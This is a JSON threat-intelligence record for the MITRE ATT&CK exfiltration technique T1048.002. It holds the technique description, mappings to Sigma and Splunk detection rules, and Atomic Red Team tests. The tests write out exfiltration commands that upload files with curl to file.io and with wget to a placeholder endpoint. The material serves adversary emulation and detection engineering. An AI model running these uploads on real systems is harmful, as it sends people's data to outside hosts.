{
    "id": "T1048.002",
    "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin.\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Exfiltration",
    "data_sources": "Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Network Traffic: Network Traffic Content, File: File Access, Command: Command Execution",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2)",
    "url": "https://attack.mitre.org/techniques/T1048/002",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1048.002",
                "atomic_attack_guid": "8bec51da-7a6d-4346-b941-51eca448c4b0",
                "atomic_attack_name": "Exfiltrate data as text over HTTPS using wget",
                "platform": "Linux",
                "splunk_rules": [
                    {
                        "rule_name": "Linux Ingress Tool Transfer Hunting",
                        "rule_link": "https://research.splunk.com/endpoint/52fd468b-cb6d-48f5-b16a-92f1c9bb10cf/"
                    }
                ]
            },
            {
                "tech_id": "T1048.002",
                "atomic_attack_guid": "7ccdfcfa-6707-46bc-b812-007ab6ff951c",
                "atomic_attack_name": "Exfiltrate data in a file over HTTPS using wget",
                "platform": "Linux",
                "splunk_rules": [
                    {
                        "rule_name": "Linux Ingress Tool Transfer Hunting",
                        "rule_link": "https://research.splunk.com/endpoint/52fd468b-cb6d-48f5-b16a-92f1c9bb10cf/"
                    }
                ]
            },
            {
                "tech_id": "T1048.002",
                "atomic_attack_guid": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
                "atomic_attack_name": "Exfiltrate data HTTPS using curl freebsd,linux or macos",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Curl Usage on Linux",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_curl_usage.yml",
                        "remote_content": "title: Curl Usage on Linux\nid: ea34fb97-e2c4-4afb-810f-785e4459b194\nstatus: test\ndescription: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-15\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: low\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Linux Ingress Tool Transfer Hunting",
                        "rule_link": "https://research.splunk.com/endpoint/52fd468b-cb6d-48f5-b16a-92f1c9bb10cf/"
                    }
                ]
            },
            {
                "tech_id": "T1048.002",
                "atomic_attack_guid": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0",
                "atomic_attack_name": "Exfiltrate data HTTPS using curl windows",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "Windows Curl Upload to Remote Destination",
                        "rule_link": "https://research.splunk.com/endpoint/42f8f1a2-4228-11ec-aade-acde48001122/"
                    }
                ]
            }
        ],
        "cycat": {
            "cycat": {
                "cycat_related_uuids": [
                    "8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5",
                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
                    "cdc842aa-761d-48e2-9b97-c344bed8b3a8"
                ],
                "lookup_results": [
                    {
                        "uuid": "8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5",
                        "lookup_data": {
                            "mitre-attack-id": "T1048.002",
                            "mitre-cti:description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ",
                            "mitre-cti:name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
                            "mitre-cti:type": "attack-pattern",
                            "raw": "{'x_mitre_platforms': ['Linux', 'macOS', 'Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['William Cain'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5', 'type': 'attack-pattern', 'created': '2020-03-15T15:34:30.767Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1048.002', 'url': 'https://attack.mitre.org/techniques/T1048/002'}, {'url': 'https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf', 'description': 'Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.', 'source_name': 'University of Birmingham C2'}], 'modified': '2021-10-15T22:44:11.953Z', 'name': 'Exfiltration Over Asymmetric Encrypted Non-C2 Protocol', 'description': 'Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \\n\\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \\n\\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'exfiltration'}], 'x_mitre_detection': 'Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) ', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Network Traffic: Network Traffic Flow', 'Network Traffic: Network Connection Creation', 'Network Traffic: Network Traffic Content', 'File: File Access', 'Command: Command Execution']}",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                        "lookup_data": {
                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1666603345",
                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
                        "lookup_data": {
                            "description": "Cyberattack on fuel supplier causes supply chain disruption",
                            "link": "http://www.botvrij.eu/data/feed-osint/cdc842aa-761d-48e2-9b97-c344bed8b3a8.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1644231782",
                            "uuid": "cdc842aa-761d-48e2-9b97-c344bed8b3a8",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1048.002",
                "display_name": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
                "atomic_tests": [
                    {
                        "name": "Exfiltrate data HTTPS using curl windows",
                        "auto_generated_guid": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0",
                        "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "input_file": {
                                "description": "Test file to upload",
                                "type": "path",
                                "default": "PathToAtomicsFolder/T1048.002/src/artifact"
                            },
                            "curl_path": {
                                "description": "path to curl.exe",
                                "type": "path",
                                "default": "C:\\Windows\\System32\\Curl.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Curl must be installed on system.\n",
                                "prereq_command": "if (Test-Path #{curl_path}) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n"
                            },
                            {
                                "description": "#{input_file} must be exist on system.\n",
                                "prereq_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact\" -OutFile \"#{input_file}\"\n"
                            }
                        ],
                        "executor": {
                            "name": "command_prompt",
                            "elevation_required": false,
                            "command": "#{curl_path} -k -F \"file=@#{input_file}\" https://file.io/\n"
                        }
                    },
                    {
                        "name": "Exfiltrate data HTTPS using curl freebsd,linux or macos",
                        "auto_generated_guid": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
                        "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
                        "supported_platforms": [
                            "macos",
                            "linux"
                        ],
                        "input_arguments": {
                            "input_file": {
                                "description": "Test file to upload",
                                "type": "path",
                                "default": "PathToAtomicsFolder/T1048.002/src/artifact"
                            }
                        },
                        "executor": {
                            "name": "bash",
                            "elevation_required": false,
                            "command": "curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n"
                        }
                    },
                    {
                        "name": "Exfiltrate data in a file over HTTPS using wget",
                        "auto_generated_guid": "7ccdfcfa-6707-46bc-b812-007ab6ff951c",
                        "description": "Exfiltrate data over HTTPS using wget --post-file method\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "input_file": {
                                "description": "Test data to upload",
                                "type": "path",
                                "default": "PathToAtomicsFolder/T1048.002/src/artifact"
                            },
                            "endpoint_domain": {
                                "description": "Endpoint to send data to",
                                "type": "string",
                                "default": "https://example.com/"
                            }
                        },
                        "executor": {
                            "name": "sh",
                            "elevation_required": false,
                            "command": "wget --post-file=\"#{input_file}\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n"
                        }
                    },
                    {
                        "name": "Exfiltrate data as text over HTTPS using wget",
                        "auto_generated_guid": "8bec51da-7a6d-4346-b941-51eca448c4b0",
                        "description": "Exfiltrate data over HTTPS using wget --post-data method\n",
                        "supported_platforms": [
                            "linux"
                        ],
                        "input_arguments": {
                            "endpoint_domain": {
                                "description": "Endpoint to send data to",
                                "type": "string",
                                "default": "https://example.com/"
                            }
                        },
                        "executor": {
                            "name": "sh",
                            "elevation_required": false,
                            "command": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 11:34:11"
}